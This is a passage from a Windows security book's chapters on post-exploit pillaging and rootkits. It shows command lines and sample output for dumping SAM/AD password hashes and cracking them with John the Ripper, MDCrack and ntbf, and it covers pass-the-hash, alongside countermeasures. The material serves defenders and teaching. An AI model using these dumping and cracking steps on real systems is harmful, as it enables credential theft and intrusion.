7 As mentioned, IE 7 uses a different method to store passwords. AutoComplete passwords  are stored in the Registry using the URL as encryption key, making it necessary to know  the URL to recover AutoComplete passwords successfully.  Saved credentials for websites are stored using DPAPI in the same file used for storing  network passwords when using the Credential Manager API  discussed in detail in the  next section .  Both  categories  of  passwords  can  be  recovered  using  the  IE  PassView  tool  from  NirSoft  Figure 7-2 . The tool requires administrative access to the system and requires  that  the  browser  history  contain  URLs  that  can  be  used  as  keys  for  AutoComplete  passwords.  Accessing the Credential Manager The  Credential  Management API  was  first  introduced  in  Windows  XP.  It  provides  a  method for applications and the operating system to associate additional credentials  with a Windows user account. The Credential Manager in XP is used to protect two  types of credentials: domain and generic credentials. Domain credentials are used by  the  operating  system  to,  for  example,  establish  network  connections  transparently.  Generic credentials are designed to be used by applications that perform authentication  directly instead of relying on the authentication functions provided by the operating  system.  One tool capable of extracting data stored with the Credential Management API is   Network Password Recovery from NirSoft  Figure 7-3 .   Chapter 7:  Post-Exploit Pillaging   207  Figure 7-2   IE PassView from NirSoft extracts the IE 7 stored data.  Figure 7-3  Network Password Recovery extracts data from Credential Manager.   208   Hacking Exposed Windows: Windows Security Secrets & Solutions   Pulling Stored Passwords  Popularity: Simplicity: Impact: Risk Rating:  5 8 6–9 8  The Local Security Policy setting Store Passwords With Reversible Encryption  in the  Password Policy section of Account Policies  is applicable only to Active Directory  AD   domain controllers. By default, this setting is disabled, meaning that passwords are not stored  with  reversible  encryption—which  is  a  good  thing.  However,  if  someone  does enable this setting, she’ll cause all newly created passwords  from that moment forward   to be stored in the SAM AD  Security Accounts Manager AD  hashed form as normal,  and also in a separate, reversibly encrypted format. Unlike one-way hashes, this format can  be easily reversed to the cleartext password if the encryption key is known.  Why  would  someone  enable  this?  It  turns  out  that  certain  remote  authentication  protocols and services such as MSChap v1, Digest Authentication, AppleTalk Remote  Access, and Internet Authentication Services  IAS, which is essentially RADIUS  require  this setting. So if an attacker compromises a domain controller, she will likely immediately  check  this  setting;  if  it’s  enabled,  she’ll  run  a  tool  to  dump  out  everyone’s  cleartext  password for the entire domain! Currently, no publicly available tools exist to perform  this task, but such a tool should be simple to build using widely documented APIs.  Dumping SAM and AD Passwords  Popularity: Simplicity: Impact: Risk Rating:  9 9 9 9  Dumping  passwords  from  the  Registry  can  be  a  trivial  exercise.  Of  course,  with  Windows 2003, the task is not entirely trivial, as the system uses the syskey function to  apply strong encryption to the SAM or AD database. This means that the usernames and  passwords  on  the  system  are  encrypted  with  128-bit  encryption,  making  it  next  to  impossible  to  crack  the  passwords.  But  these  encrypted  hashes  can  still  be  obtained  through the use of the modified pwdump2 tool by Todd Sabin.  See “References and  Further Reading.”  Another addition is to patch these tools to support dumping password  history  from  users,  which  can  also  increase  the  likelihood  of  more  access  around  the  network since users tend to reuse or recycle passwords.  The generic technique used for getting the hashes is the same across all versions of the  Windows operating system. Various tools use different vectors to achieve the same goal. Pwdump2 uses a technique called dynamic link library  DLL  injection. In this technique,  one process forces another process to load an additional DLL and then executes code  within the DLL in the other process’s address space and user context.   Chapter 7:  Post-Exploit Pillaging   209  To use pwdump2, simply copy the two files  pwdump2.exe and samdump.dll  onto  the remote system, and then execute the pwdump2 command interactively on the remote  system: Remote C:\>pwdump2 Administrator:500:a962ae9062945822aad3b435b51404ee:ef830b06fc94947d66 8d47abf388d388::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:28f30eb0bcce2 3b95c5b1c23c771959f:::  Unlike prior versions of Sabin’s pwdump2 tool, this new tool will “automagically”  determine the LSASS process ID and perform the DLL injection. In the old version, you  had  to  determine  the  LSASS  process  manually  with  pulist.exe   another  Resource  Kit  utility  and use it as a parameter with pwdump2.  A  newer  version,  pwdump3,  offers  minor  modifications  over  pwdump2—the  primary  one  being  that  it  can  be  run  remotely  against  a  compromised  system.   Administrator-equivalent privileges are required, as always, as well as access to SMB  services TCP 139 or 445.  Pwdump3e will not run locally; it must be run against a remote  machine.  Here  is  sample  output  of  pwdump3e  against  a  Windows  2003  Enterprise  Edition server: C:\> PwDump3e.exe 10.1.1.5 pwdump3e  rev 1  by Phil Staubs, e-business technology, 23 Feb 2001 Copyright 2001 e-business technology, Inc.

If the access to dump credentials from the memory is restricted, one can also try to  fetch both SAM and SYSTEM files from a backup directory  making a new copy with the  old rdisk  s - . Both files need to be fetched, as the SYSTEM file contains the SysKey  with which to decrypt the hashes from the SAM file. One such tool able to do this is  pwhist.exe, which is also able to dump password history.  Pwdump2 will not work out of the box in Windows Vista, because the LSASS process  has  moved  to  the  service  Window  Station Desktop,  which  causes  the  CreateRemote- Thread API to fail. As the source code for pwdump2 is publicly available, modified ver- sions exist that are capable of extracting the password hashes in Windows Vista.  See  “References and Further Reading” for links to versions of this tool.    210   Hacking Exposed Windows: Windows Security Secrets & Solutions   Countermeasure: Dumping SAM and AD Passwords Once  again,  little  can  be  done  to  prevent  the  dumping  of  password  hashes  once  an  attacker has gained administrative privilege on a Windows system. Your best bet is never  to let an attacker gain administrative privilege to begin with.  PASSWORD CRACKING  After  the  encrypted  passwords,  or  hashes,  are  obtained  from  the  remote  system,  the  attacker will typically move them into a file and run a password cracker against them to  uncover the true password.  Many are under the mistaken impression that password cracking is the decryption of  password  hashes.  This  is  not  the  case,  however,  as  no  known  mechanisms  exist  for  decrypting passwords hashed using the Windows algorithms. Cracking is actually the  process  of  hashing  known  words  and  phrases  using  the  same  algorithm  and  then  comparing  the  resulting  hash  to  the  hashes  dumped  using  pwdumpX  or  some  other  tool. If the hashes match, the attacker knows what the cleartext value of the password  must  be.  Thus,  cracking  can  be  seen  as  a  kind  of  sophisticated  offline  password  guessing.  Cracking LM Hashes  The cracking process can be greatly optimized due to one of the key design failings of  Windows, the LAN Manager  LM  hash. As discussed in Chapter 2, certain versions of  Windows by default store two hashed versions of a user account’s password:     The LAN Manager  LM  hash    The NT hash   We go deeper into cracking NT hashes a little later in the chapter.   The LM hash has an undesirable property  from an administrator’s point of view :  the effective key space is very small. Since the maximum effective password length is  seven characters  as discussed in Chapter 5  and the passwords are case-insensitive, the  maximum  number  of  unique  LM  hashes  that  can  be  generated  from  passwords  is  approximately 7.5 × 1012. Because most people do not use the entire range of printable  ASCII characters when choosing passwords, the actual complexity is far less. Depending  on the character set used, the number of unique LM hashes can be found by using the  following equations:    A–Z  26 characters in 7 positions = 267 ~ 8 × 109 hashes   A–Z + 0–9  36 characters in 7 positions = 367 ~ 8 × 1010 hashes   All printable  69 characters in 7 positions = 697 ~ 7.5 × 1012 hashes   Chapter 7:  Post-Exploit Pillaging   211  Two feasible methods can be used to attack LM hashes. The first is straightforward  and consists of generating all possible password hash pairs and comparing them with a  selection of target hashes—this is a brute force attack. Many programs available on the  Internet can be used to perform this task, although performance varies quite a lot. The  following list shows benchmarks performed on an Intel G40 laptop  3 GHz CPU, 1 GB  RAM   with  Windows  2000  using  lmbf  v0.1   available  from  www.toolcrypt.org ,  jtr  v1.7.0.1, Cain & Abel v4.9, and L0phtcrack look-alike LCP v5.0.4:    lmbf  5.7 × 106 t s for a single hash   jtr  5.0 × 106 t s for a single hash   Cain & Abel  4.1 × 106 t s for a single hash   LCP  1.5 × 106 t s for a single hash  Performance  drops  slightly  for  multiple  hashes,  but  since  no  salt   a  random  number  added to the encryption key or the password to protect it from disclosure  is used, they  can be effectively cracked in parallel.  A little calculation shows that it would take approximately 15 days  697 ÷  5.7 × 106 ×  3600 × 24   to crack every possible LM hash using lmbf on a standard laptop. Since lmbf  does not allow the use of different character sets—it works on the maximum character  set only—we would use jtr for the other cases: to crack all hashes based on passwords  using only A–Z would take 27 minutes, and all hashes based on A–Z + 0–9 would take  4 hours and 20 minutes.  The other feasible way to crack LM hashes is to use rainbow tables. The rainbow  table method is used to calculate all the hashes resulting from passwords with certain  constraints  up to seven characters long, using A–Z, and so on . These hashes are then  stored so that only a fraction of the actual hashes has to be present on disk. This method  is feasible because the key space has not been extended by the use of cryptographic salt.  Assuming  you  have  the  time  available  to  create  the  rainbow  tables  initially,  and  you  have the disk space to store them, you can crack any LM password in a minute or two.  Following  are  some  popular  rainbow  tables  generated  by  RainbowCrack   see   “References and Further Reading” :    A–Z  Size 610 MB, success rate 99.90 percent   A–Z + 0–9  Size 5 GB, success rate 99.04 percent   All printable  Size 64 GB, success rate: 99.90 percent  These figures should make it clear that an attacker who has obtained your LM hashes  will also be able to deduce the corresponding passwords, regardless of their complexity,  as long as they consist of the printable ASCII characters.  Next, we cover some tools that heavily automate the hash compare cycle, especially  against the LM hash, to the point that no poorly chosen password can resist discovery  for long.   212   Hacking Exposed Windows: Windows Security Secrets & Solutions   Password Cracking with Command-line Tools  such as John the Ripper and Lmbf Popularity: Simplicity: Impact: Risk Rating:  9 8 7 8  One of our favorite NT 2000 2003 password cracking tools is John the Ripper by   Solar Designer.  See “References and Further Reading” for a link.  We also like lmbf.  To run John against a set of hashes, simply pass the filename as the first parameter:  C:\>john hashes.txt Loaded 13 passwords with no different salts  NT LM DES [24 32 4K]  PASSWORD              administrator:1  HAPPY                 backup:1   By default, John performs dictionary attacks and uses some intelligence in how it  performs  the  crack  attempts,  including  prepending  and  appending  common  metacharacters,  using  the  username  as  the  password,  and  trying  variations  on  the  username, to name a few. John can also be used to brute force accounts by using the  incremental mode -i. Incremental mode uses the full character set to try all the possible  combinations of characters for the password. This is by far the most powerful part of  John and subsequently takes the longest to run. Three major modes are available in John  usage: wordlist, single-crack, and incremental.  Wordlist Mode  The simplest of modes for cracking, wordlist mode takes the dictionary  file given, or uses the default password file included with John if no option is given, on  the command line and tries each password in sequential order.  Single-Crack  Mode  This  mode  will  try  login  information  to  guess  the  password.  For  example, the username on one account will be tried as the password on all accounts. In  the following example, the username STU was successfully tried as the password for  JACK: C:\>john -single hashes.txt Loaded 20 passwords with no different salts  NT LM DES [24 32 4K]  STU               jack:1  Incremental Mode  This mode is certainly the most powerful of the John cracking modes,  as it tries all character combinations for the given password length. Passwords that use  complicated characters but are short in length can be easily cracked with this mode. Of  course, due to its comprehensive nature of trying each character in the character space,  the cracking time for this mode will be long.   Chapter 7:  Post-Exploit Pillaging   213  Here’s an example, as STU is discovered to have a password of APQL, which almost  certainly would have never been found with a standard dictionary attack. The incremental  mode of alpha was used to limit the search to alpha characters, but without any mode,  John uses the default option, which incorporates all the incremental modes including all  character set variations: C:\>john -incremental:alpha hashes.txt Loaded 1 password  NT LM DES [24 32 4K]  APQL              stu:1   John  is  a  powerful  password-cracking  utility  and  can  be  used,  e.g.,  for  Windows  NT 2000 2003 2008,  and  UNIX  password  cracking.  The  only  limitation  with  the  Windows version port of John, if you can call it that, is that John does not have native  support of the NTLM hash. This means that all passwords recovered with John will be  case-insensitive. As you can see with the previous example, STU has a password of APQL, but we don’t know if this password is truly all caps or not, so you will need to try all  variations of uppercase and lowercase characters to determine the true password.  Lmbf can also be sued to crack LM hashes. Here’s an example:  f:\tools>lmbf hashes.txt out.txt lmbf v0.1,  C 2005 orm@toolcrypt.org ------------------------------------ parsing hashes.txt... 1 lines read analyzing input... done trying lmbf.dat... 154 entries. 1 hashes found starting bf mode... q=quit, any other key to see status current password: ?07T  cracked:1 2  unique  18753660 passwords tried. elapsed time 00:00:03. t s:5674756 all hashes cracked. press any key to exit F:\tools>type out.txt      public:[^AD1  Support for Windows NT OWF hash has been added for both UNIX and Win32 versions of John.

No  length  constraint  exists even though the practical limit is 128 characters in Windows NT 2000 XP Vista.  This means that the space of all possible NT hashes is huge. Nobody could even begin to  explore it in its entirety. However, a poorly chosen password will remain weak no matter  what hash mechanism is used to protect it. If we make the assumption that the password  is at most seven characters long, we come up the following hashing potential:    A–Z  26 characters in 7 positions gives 267 ~ 8 × 109 hashes   A–Z + 0–9  36 characters in 7 positions gives 367 ~ 8 × 1010 hashes   A–Z + a–z  52 characters in 7 positions gives 527 ~ 1 × 1012 hashes   A–Z + a–z + 0–9  62 characters in 7 positions gives 627 ~ 3.5 × 1012 hashes   All printable  95 characters in 7 positions gives 957 ~ 7.0 × 1013 hashes  Every character in excess of 7 will make the password 26, 36, 52, 62, or 95 times more  difficult to crack, depending on the character set used. This means that passwords of  length 8  using all printable  instead of 7 will be almost 100 times harder to crack.  Since the NT hashes do not use cryptographic salt, the methods for attacking them  are the same as those used for LM hashes. Many brute-force applications are available,  which differ widely both in speed and usability. A selection is outlined next. Bench- marks were obtained with the same computer setup used for the LM hashes and using  ntbf  v0.6.6,  jtr  v1.6  with  NTLM  patch,  Cain  & Abel  v4.9,  LCP  v5.0.4,  and  MDCrack  v1.8 3 :    MDCrack 6.9× 106 t s for a single hash   ntbf  6.2 × 106 t s for a single hash   Cain & Abel  6.2 × 106 t s for a single hash   jtr  5.0 × 105 t s for a single hash   LCP  3.5 × 103 t s for 10 simultaneous hashes from the local SAM; would not   run NTLM tests on a pwdump ﬁ le containing a single hash  Performance  drops  slightly  for  multiple  hashes,  but  since  no  salt  is  used,  they  can  effectively be cracked in parallel.  Some  straightforward  calculations  show  that  it  would  take  us  a  maximum  of  117  days to crack the most complex NT hash generated from a password seven characters  long using all printable characters and using MDCrack on a single laptop. It would take  a maximum of 5.9 days for a hash generated from a seven-character password using A–Z  + a–z + 0–9.   Chapter 7:  Post-Exploit Pillaging   215  NT Password Cracking with MDCrack, ntbf  Popularity: Simplicity: Impact: Risk Rating:  6 5 7 6  If NTLM password hash cracking is a must for you, one solid alternative is MDCrack  from Gregory Duchemin. The product is fairly raw in its port over to Windows, but it  works well. Just be careful that it doesn’t take over your system’s CPU cycles, as it tends  to set the priority on its process to High. As a result, you should change the priority to  Normal once it starts up.  MDCrack’s usage is a bit different from that of LCP  introduced later , in that it takes   in the hash itself on the command line: MDCrack-sse.exe --charset=%L --algorithm=NTLM1 363dd639ad34b6c5153c0f51165ab830 System   Starting MDCrack v1.8 2  System   Running as MDCrack-sse.exe --charset=%L --algorithm=NTLM1 363dd639ad34b6c5153c0f51165ab830 System   Filtering custom charset... done System   Detected processor s : 1 x INTEL Pentium IV  MMX  SSE System   Charset is: abcdefghijklmnopqrstuvwxyz System   Target hash: 363dd639ad34b6c5153c0f51165ab830 System   >\> Entering NTLM1 Core 1: candidate salt max size: 9 Info     Press ESC for available runtime shortcuts  Ctrl-c to quit  Info     Thread 0: Candidate size: 1   + salt: 0   Info     Thread 0: Candidate size: 2   + salt: 0   Info     Thread 0: Candidate size: 3   + salt: 0   Info     Thread 0: Candidate size: 4   + salt: 0   Info     Thread 0: Candidate size: 5   + salt: 0   Info     Thread 0: Candidate size: 6   + salt: 0   Info     Thread 0: Candidate size: 7   + salt: 0   ----------------------------------------------------------  Thread 0  Success \---- System   Thread 0: Collision found: crackme Info     Thread 0: Candidate Hash pairs tested: 1704117380   1.70e+009   in 2min  49s 473ms Info     Thread 0: Allocated key space: 4.54e+022 candidates, 0.00% done Info     Thread 0: Average speed: ~ 10055351   1.01e+007   h s  As you can see, the MDCrack utility cracked the NTLM hash, showing us the password  crackme.   216   Hacking Exposed Windows: Windows Security Secrets & Solutions   This example uses ntbf  see “References and Further Reading”  from the command   line: F:\tools>ntbf hashes.txt pwds.txt 2 7 ntbf v0.6.6,  C 2004 orm@toolcrypt.org -------------------------------------- input file: 1 lines read  checking against ntbf.dat... 27588 entries. 0 hashes found trying empty password... not found trying password = username... 0 hashes found starting bf mode: complexity 2, max password length 7... q=quit, h=help, s=stats current password:lmsnnca  cracked:0 1  unique  351216826 passwords tried. elapsed time 00:00:56. t s:6226022 all passwords are cracked. press any key to exit  F:\tools>type pwds.txt public:crackme  Password Cracking with GUI Programs such as  LC4, LC5, LCP, and Cain & Abel Popularity: Simplicity: Impact: Risk Rating:  9 8 7 8  If you want point-and-click ease for your password-cracking activities at the price of  performance and, well, price, check out LCP from lcpsoft. L0phtcrack had long been the  most widely recognized password cracker for NT, and although the fourth edition didn’t  add a slew of new features over the previous version  auditing and recovery features , it  will probably remain a popular option for those who still have it, because of its easy-to-use  GUI and the SMB Capture feature that can harvest LM responses off the wire  now functional  under Windows 2000 2003 . The fifth version also brought the use of rainbow tables.  Since Symantec decided to end the life of L0phtcrack after its fifth incarnation, users  are now forced to seek alternatives, such as LCP and Cain & Abel. LCP is easy to use, and  it  supports  even  more  options  than  LC5.  See  http:  www.lcpsoft.com english  comparison.htm.  Three parameters can be configured for a LCP cracking session: Dictionary Crack,   Dictionary Brute Hybrid Crack, and Brute Force Crack.  Figures 7-4, 7-5, and 7-6 show various programs that can be used to crack hashes.

The best countermeasure is to prevent the attacker  from gaining administrative privilege in the first place. The next countermeasure is to  enforce strong passwords or passphrases that make it unrealistic for an attacker to wait  for them to be cracked.  To enforce stronger passwords, do the following:            1.  Start the Local Security Settings application. 2.  Select the Account Policy  Password Policy leaf. 3.  Set the following minimum options:     Enforce Password History: 5 passwords remembered    Maximum Password Age: 30 days    Minimum Password Length: 8 characters    Passwords Must Meet Complexity Requirements: Enabled   We recommend an eight-character minimum password length in light of the  realities of password cracking. The eighth character does not improve security  at all in the face of an LM-cracking attack, since it is immediately guessed.    Chapter 7:  Post-Exploit Pillaging   219  However, a remote password-guessing attack will typically be more difﬁ cult  against an eight-character password than a seven-character one, by a factor of  128, assuming half of the 8-bit ASCII character set is used. You may consider  using the longer password length in your policy if remote password guessing  is more of a risk in your environment.  See Chapter 5 for a discussion of remote  password guessing.    In addition, remember that you can turn off the storage of the LM hash  altogether by creating a key called HKLM\SYSTEM\CurrentControlSet\ Control\Lsa\NoLmHash.     This option is supported in Windows XP and Windows Server 2003 under Security Policy Security  Options Network Security: Do Not Store LAN Manager Hash Value On Next Password Change.     4.  Finally, reboot your system. Of course, this Registry key is not supported and   may potentially break certain applications, so its usage should be carefully  considered and employed only on test systems and never on production boxes.  Disabling the storage of the LM hash does not erase any currently existing LM hashes. However,  when a user changes her password, the LM hash will not be updated in the SAM or Active Directory.  Thus, the old LM hash might still be sent along with the NTLM hash during network challenge  response authentication  see Chapter 2 , and this may cause authentication failures or other  problems. It is possible to delete LM hashes from the SAM by using the tool trashlm from toolcrypt  .org.  Another  tool,  trashpwhist,  is  also  available  from  toolcrypt.org  and  can  be  used  to  remove  password history entries from the SAM.  To disable usage of the LM hash in network authentication, use the LMCompatibility  Registry  key  or  the  LM Authentication  Level  Security  Policy  setting,  as  discussed  in  Chapter 5.  Passing the Hash Using Credentials  Popularity: Simplicity: Impact: Risk Rating:  5 4 8 6  Since the hashes derived from dumping programs are the equivalent of passwords,  why couldn’t the hash be passed directly to the client OS, which could, in turn, use it in  a normal response to a logon challenge? Attackers could then log on to a server without  knowing a viable password and with just a username and the corresponding password  hash  value.  This  would  save  a  great  deal  of  time  spent  actually  cracking  the  hashes  obtained via SMB Capture. In 1997, Paul Ashton posted the idea of modifying a Samba  UNIX SMB file-sharing client to perform this trick. His original post is available in the  NT  Bugtraq  mailing  list  archives  and  at  SecurityFocus.com.  Recent  versions  of  the  Samba smbclient for UNIX include the ability to log on to NT clients using only the  password hash.   220   Hacking Exposed Windows: Windows Security Secrets & Solutions   In  2000,  CORE-SDI’s  Hernan  Ochoa  wrote  and  published  a  paper  discussing  the  technical details of passing the hash that lays out how the LSASS stores the logon sessions  and their associated credentials  see “References and Further Reading” . Hernan’s paper  details how to edit these values directly in memory so that the current user’s credentials  can be changed and any user impersonated if his hash is available. CORE developed a  proof-of-concept program that performed this technique on NT 4, but its implementation  violated LSASS integrity on Windows 2000 2003 and caused the system to shut down  within a matter of seconds.  Existing tools for performing pass-the-hash do work flawlessly on all versions of  NT 4, Windows 2000, Windows XP, Windows Vista, and Windows 2008, without violating  the integrity of the LSASS process. Most of these tools have been handled with sensitive  disclosure and have not been released to the public. At the time of this writing, Hernan  Ochoa has made a pass-the-hash toolkit available that works on more recent versions of  Windows. The toolkit is limited to certain versions of the operating system, but is under  active development  see “References and Further Reading” .  Pass-the-hash attacks rely on the built-in functionality for Single-SignOn that can be  found in authentication protocols such as Kerberos and NTLM. In order for the operating  system to authenticate a user silently, the system needs to have some kind of cache for  the credential mapped to the user requesting a protected resource. By replacing the user’s  credential in this cache with a chosen password hash or ticket, the authentication will be  done using the new “secret” instead of the original one.  Also  worth  noting  is  that  Single-SignOn  functionality  is  connected  to  your  logon  session.  Stale  sessions  can  be  reused  by  the  attackers—without  their  knowing  the  password or hash. This is important especially in terminal services environments and  further accentuates the importance of logging off after finishing a session.  No countermeasure for this attack currently exists, as it is part of the built-in Single-  SignOn functionality.  RINSE AND REPEAT  Probably the greatest risk in allowing an attacker access into one particular system is that  he can leverage that system to gain access into additional systems. This ability to take  one system’s compromise and attack other systems once out of reach of the attacker is  called “island hopping.” The beauty for the attacker is that he can usually set up shop for  extended periods of time and run amok almost completely anonymously.  The typical next steps used to compromise the rest of the network follow the “rinse  and repeat” mantra: copy over the attacker’s toolkit  much of which was described in  this chapter , and simply restart the methodology we’ve described in this book back in  Chapters 3 and 4, with footprinting, scanning, enumeration, and so on. Only this time,  these procedures will be executed from the compromised system that now provides the  launching pad for a broader attack into the compromised environment.  SUMMARY  Expanding influence once administrative or SYSTEM level access is gained on a Windows  system can be a trivial exercise, although with newer versions of the operating system    Chapter 7:  Post-Exploit Pillaging   221  this exercise comes harder. You can, however, do much to mitigate the risk and manage  the situation even after a compromise has occurred.  Auditing should always be enabled and monitored for change. Passwords should be  difficult to guess and should always include an ALT-255 character, as many of these hacks  cannot  read  the  specific  nonprintable  character  it  uses.  Attackers  can  easily  gain  command-line  control  of  a  system  or  GUI  control  as  well. A  number  of  tools  exist  to  perform both types of control.  A common practice among attackers is to search your entire drive looking for files  with sensitive information in them. Words like password and payroll are commonly used  in  the  filter.  Keystroke  logging  can  be  used  as  well,  to  capture  every  keystroke  on  a  computer, even the login username and password.  Island hopping is a particularly dangerous phenomenon whereby the attacker sets  up shop on the system, peering into the back closet if you will, finding additional systems  of potential compromise.  Finally,  port  redirection  allows  an  attacker  easily  to  bypass  firewall  rules  once  an   initial host behind the firewall has been hacked.

Since publication of the previous  version of this book, not only have the techniques used to achieve stealth matured, but  the motivations of the malicious hackers have changed as well, and the level of sophistica- tion needed to compete in the game of “cat and mouse” has increased dramatically for  both attackers and defenders alike. If you are reading this chapter, you have probably al- ready heard about rootkits, a term that refers to a wide variety of stealth software.  This  chapter  covers  the  evolution  of  the  Windows  rootkit  and  its  importance  in  achieving stealth, but it also goes beyond discussing rootkits by enumerating techniques  the author and his colleagues have personally encountered during investigations into  real-world hacking cases. In these cases, malicious hackers have achieved stealth using a  variety of lesser-known techniques hiding in plain sight without resorting to the use of  sophisticated rootkit technology.  THE RISE OF THE ROOTKIT  Before diving into the history of rootkits and stealth technology for Windows, we’ll offer  up a quick definition of a rootkit and describe some properties and attributes of a rootkit  and other common stealth software. If you search for the origins of the term rootkit on the  Internet, you’ll find references to the early days of hacking UNIX-based platforms that  began to be noticed in the 1980s and early 1990s. Perhaps one of the most memorable  accounts of the early days of hacking is chronicled in the book The Cuckoo’s Egg by Clifford  Stoll, which is his first-hand account of an investigation that resulted in the arrest of a  German  hacker  after  he  successfully  hacked  numerous  U.S.  academic  and  military  networks with the intent of stealing and selling sensitive information to the Soviet KGB. The term root refers to the most privileged account on a typical UNIX installation,  similar to the built-in Administrator account on Windows. A kit in this case refers to the  collection of tools and software modules that are dropped on the compromised system  by a malicious hacker after he or she has gained access to the system. Root as used in the  term rootkit could refer to the act of elevating privileges to root  usually done via the use  of an elevation of privilege–type of exploit , or maintaining root-level access after such  access has been obtained, or both.  In the early to mid-1990s UNIX rootkits were typically nothing more than a collection  of modified  recompiled with extra code  core operating system binaries or simple shell  scripts. For example, the ls command is used by UNIX administrators to list files on the  file system, so early UNIX rootkits often contained a modified copy of the ls command  that would simply omit the contents of certain folders that the malicious hacker did not  want  the  systems  administrators  to  see.  Because  it  was  usually  possible  to  obtain  the  source code for the version of UNIX being attacked, it was fairly straightforward for the    Chapter 8:  Achieving Stealth and Maintaining Presence   227  attackers to insert their own source code into popular system utilities and recompile them  to make their own custom Trojaned copies of popular UNIX commands like ls. But what  if the administrator happened to run the ps command to list all of the running processes  and noticed the attacker’s backdoor process? Many early rootkits also included a modified  copy of the ps binary designed not to list the malicious hacker’s backdoor processes.  Over time, administrators generally became aware of this technique through alerts  and advisories from institutions like CERT and started using only “known good” copies  of  popular  system  commands  like ls  and ps   perhaps  from  read-only  media  like  a  floppy disk or a CD  when investigating a system. They also maintained databases of  checksums  and  cryptographic  hashes  of  key  system  files  to  determine  whether  the  operating  system  binaries  were  legitimate  or  modified,  and  they  routinely  started  checking  the  sums,  or  hashes,  of  key  files  on  the  system.  To  counter  this,  malicious  hackers had to evolve their skillset, and this meant pushing their code deeper into the  operating system—that is, the kernel.  Eventually in the late 1990s hackers and various security researchers started looking  into the use of kernel modules that, once loaded, would alter key kernel APIs and data  structures so that it didn’t matter if administrators were using known good copies of key  operating system utilities, because these utilities still relied on information emitted from  kernel APIs, and if the attacker could control those APIs, he or she could control your  view of the operating system  as seen by utilities such as ls and ps . And thus an arms  race  was  born,  which  is  still  being  played  out  to  this  day  and  on  a  wide  variety  of  operating systems such as Windows and Linux.  Windows Rootkits  So what can be hidden from an administrator with a Windows-based rootkit? The quick  answer is anything and everything. If you are an administrator and a well-written rootkit  has been installed on your machine, you see only what the rootkit allows you to see with  normal  system  tools.  The  following  items  are  commonly  hidden  using  Windows  rootkits:  Processes Files and folders Drivers  Services  Registry entries Object Manager objects  Network connections User accounts Pages of memory  It is important to note that not all rootkits hide all of these objects. The more that a  malicious hacker chooses to hide, the more complex and sophisticated the code has to be.  Some rootkits are very small and are designed to hide only certain items—for example,  the original FU rootkit  discussed in more detail later  hid only running processes, but  the files backing those processes remained visible on disk. Compare this to the Hacker  Defender rootkit for Windows, which can hide most of the items above.  Some rootkits provide additional services to the malicious hackers who install them.  For example, some rootkits provide a built-in backdoor that can be connected to remotely   such as Hacker Defender and YYT_HAC , while others strive to go that extra mile for  the  miscreant  by  providing  the  ability  to  adjust  the  list  of  hidden  files,  folders,  and    228   Hacking Exposed Windows: Windows Security Secrets & Solutions   processes; perform DoS attacks; fetch remote files; lie about the amount of free space on  a  volume;  and  reboot  the  system.  For  example,  Hacker  Defender  can  alter  the  user’s  view of the available disk space—this feature has often been used by hackers for setting  up warez servers.  It is difficult to pinpoint exactly when rootkits were first used by malicious hackers  when compromising Windows machines  after all, the goal of a rootkit is to allow the  malicious hackers to go undetected for as long as possible , but it has become generally  accepted that one of the first individuals to thrust rootkit technology for Windows into  the limelight was Greg Hoglund, when he posted a description  and definition  of an  NT-based rootkit to the Phrack online magazine in the fall of 1999  see “References and  Further Reading” . This posting not only attempted to describe and further refine the  definition of a rootkit for Windows, but it also described a simple 4-byte patch that could  be made to the Window NT kernel to disable all access and security checks allowing  unprivileged users access to privileged objects. From there, Hoglund went on to create  what is generally considered to be one of the first true Windows NT kernel-mode rootkits   NTRootkit  and register the domain rootkit.com in March 1999; and he helped create an  actively growing online community of people devoted to furthering work in the area of  achieving and maintaining stealth. He also began teaching classes entitled “Aspects of  Offensive Rootkit Technology” that taught students how to develop their own kernel- mode rootkits  based on his own NTRootkit source code  at various Blackhat security  conferences in February 2003 in Seattle.  One of the earliest hacking cases in which this author was involved and in which  rootkits were used was eventually reported by the media in early 2003  see “References  and Further Reading” . A customer had called Microsoft when suddenly one of their  SQL servers started crashing on a fairly regular basis. The escalation engineer at Microsoft  who debugged the crash dumps was stumped by what he eventually found. Somehow  the device driver responsible for the crashes was nowhere to be found on the file system   because it was using its stealth techniques to hide , and we were not able to track down  the company responsible for the driver by searching the Web  we were able to get the  name of the driver and its contents from the memory dumps . Dumping the raw memory  where  the  device  driver  was  loaded  revealed  an  interesting  string, SLANRET,  which  eventually was used in the naming of the rootkit by the various AV vendors.  Sherri Sparks and James Butler have presented a great summary of the evolution of  rootkits  see “References and Further Reading” , which is broken down into generations  based on their properties and shown here:     First-Generation Rootkits     Replaced modiﬁ ed ﬁ les on the hard drive     Second-Generation Rootkits     Kernel- and user-mode function hooking static object patching     Third-Generation Rootkits     Dynamic object patching  via DKOM—more on this later     Exclusively kernel mode   Chapter 8:  Achieving Stealth and Maintaining Presence   229     Fourth-Generation Rootkits     Virtual Memory subversion  Shadow Walker ?    Hypervisor-based rootkits  Blue Pill, Vitriol ?    Hardware-based rootkits?    Bootkits  Bootroot, VBootkit ?  Rootkits, it seemed, had officially gone mainstream and system administrators were  at  a  severe  disadvantage  in  the  game  of  cat  and  mouse  if  their  servers  were  compromised.  THE CHANGING THREAT ENVIRONMENT  In  the  late  1990s  and  early  2000s,  most  normal  households  didn’t  have  access  to  the  Internet; those who did usually accessed the Web via slow dial-up or via small pockets  of  high-speed  connections.  The  threat  environment  for  Windows  users  at  the  time  reflected this relative lack of ubiquity: malware that was written for Windows was still  largely exploratory in nature and mass-mailing worms were becoming common, as was  the occasional Windows worm, but this was predominantly malware written for fun or  curiosity, not for profit. Occasionally malware would spread and cause major outages for  various institutions as infected servers repeatedly crashed or experienced other problems,  but the malware was usually designed to spread far and fast with stealth not typically  being used.  In these early days, especially in the early 2000s, it was not uncommon for malicious  hackers  to  target  universities  and  compromise  their  Windows  servers.  After  all,  universities at the time usually had very fast Internet connections and most had very lax  inbound  filtering  rules   if  they  had  any  at  all .  At  the  other  end  of  these  Internet  connections was usually an NT 4.0 server or a Windows 2000 server that was accessible  via the Internet. In the days before Automatic Updates and Windows Updates, it was not  uncommon to find unpatched servers at the end of these connections. Some of the more  common incident response cases this author worked on between 2002 and 2003 involved  university servers across the country. Usually the network administrators would alert  the system administrators that they suspected their machines had been compromised  after analyzing network flow data and finding suspicious network traffic traveling to or  from the machine. The network administrators would usually notice a sudden decrease  in  available  bandwidth  or  an  increase  in  